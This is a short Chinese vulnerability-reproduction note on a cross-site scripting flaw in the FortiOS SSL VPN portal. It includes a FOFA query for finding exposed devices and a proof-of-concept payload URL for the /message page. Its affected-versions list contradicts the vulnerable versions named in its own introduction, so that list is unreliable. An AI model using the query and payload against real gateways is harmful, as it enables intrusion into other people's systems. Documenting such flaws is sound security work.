# Fortinet FortiOS message存在xss漏洞

# 一、漏洞简介
Fortinet FortiOS是美国飞塔（Fortinet）公司的一套专用于FortiGate网络安全平台上的安全操作系统。该系统为用户提供防火墙、防病毒、IPSec/SSLVPN、Web内容过滤和反垃圾邮件等多种安全功能。 Fortinet FortiOS 6.0.0版本至6.0.4版本、5.6.0版本至5.6.7版本和5.4及之前版本中的SSL VPN Web门户存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。

# 二、影响版本
+ Fortinet Fortios 6.2 Fortinet Fortios 6.0.5 Fortinet Fortios 5.6.8

# 三、资产测绘
+ fofa`app="FORTINET-SSLVPN"`
+ 特征

![1708092353453-aa4ebd52-c568-4244-9a91-8c5c81c9e9ec.png](./img/0z6DxK_7a53VYND6/1708092353453-aa4ebd52-c568-4244-9a91-8c5c81c9e9ec-153803.png)

# 四、漏洞复现
```java
/message?title=x&msg=%26%23<svg/onload=alert("xss")>;
```

![1708092676710-d70e54d3-4e63-4221-bde2-42a5a8c02563.png](./img/0z6DxK_7a53VYND6/1708092676710-d70e54d3-4e63-4221-bde2-42a5a8c02563-562975.png)



> 更新: 2024-02-29 23:57:11  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/uvpivrra61yfuuzn>